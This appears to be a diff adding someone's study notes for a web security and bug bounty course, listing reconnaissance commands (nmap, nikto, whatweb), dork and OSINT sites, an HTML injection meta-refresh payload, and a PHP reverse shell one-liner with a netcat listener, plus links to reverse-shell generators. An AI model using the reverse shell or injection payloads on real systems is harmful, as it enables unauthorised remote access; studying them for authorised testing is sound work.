@@ -1,0 +1,70 @@
+-- Web Security and Bug Bounty --
+
+Course OutLine : Virtual Lab > Enumeration > BurpSuite > Html Injection > Command Line Injection > Broken Auth > Access Control > XSS > SQLI > Loggin + Monitoring > Bug Hunting
+
+Web Pong : Information Gathering > Scanning > Enumerating and discovering Vulnerabilities [website and Network Testing] >  Bug Bounty
+
+Information Gathering  : nmap, nikto, dirb, google dorks, burpsuite
+
+Website Enumeration:
+
+Shodan Dork :: https://mr-koanti.github.io/shodan
+Github Dork :: https://mr-koanti.github.io/github.html
+Bug Bounty Helper :: https://dorks.faisalahmed.me/#
+Lopseg Osint :: https://www.lopseg.com.br/osint
+BLind XSS : https://husseinphp.github.io/
+
+https://taksec.github.io/google-dorks-bug-bounty/
+https://nitinyadav00.github.io/Bug-Bounty-Search-Engine/
+https://dorks.faisalahmed.me/#
+https://thegrayarea.tech/5-google-dorks-every-hacker-needs-to-know-fed21022a906
+https://hazanasec.github.io/2021-03-11-Dorking-on-Steriods/
+https://mr-koanti.github.io/github.html
+
+ping <link>
+host <link>
+nslookup <link>
+whois <link>
+whatweb <link>
+whatweb --aggression 3 -v <link>
+whatweb --aggression 3 -v 127.0.0.1/24
+whatweb --aggression 3 -v 127.0.0.1/24 --no-error
+dirb <ip/link>
+dirbuster -u <link>
+
+https://www.nslookup.io/website-to-ip-lookup/
+https://www.site24x7.com/tools/find-ip-address-of-web-site.html
+https://dnschecker.org/domain-ip-lookup.php
+
+nmap <ip>
+nmap -sV <ip>
+nmap --script vuln 10.0.0.1
+
+nikto -host <ip>
+nikto -host <ip> -port 8081
+
+For Every Bug:
+
+--> What is it 
+--> How can we do it 
+--> How do we fix it 
+
+Html Injection:
+--> You can use any seaech button
+--> User Agent
+--> Edit Cookie Value any parameter : <meta http-equiv="refresh" contain="5; URL=https://www.google.com">
+
+Command Injection:
+
+https://gabb4r.gitbook.io/oscp-notes/cheatsheet/command-injection-cheatsheet
+https://book.hacktricks.xyz/pentesting-web/command-injection
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md
+
+php -r '$sock=fsockopen("<ip>",1234);exec("/bin/bash -i <&3 >& 3 2>& 3");' >>>> nc -lvp 1234
+
+online Exploit:
+https://weibell.github.io/reverse-shell-generator/
+https://www.revshells.com/
+https://tex2e.github.io/reverse-shell-generator/index.html
+https://webhook.site
+
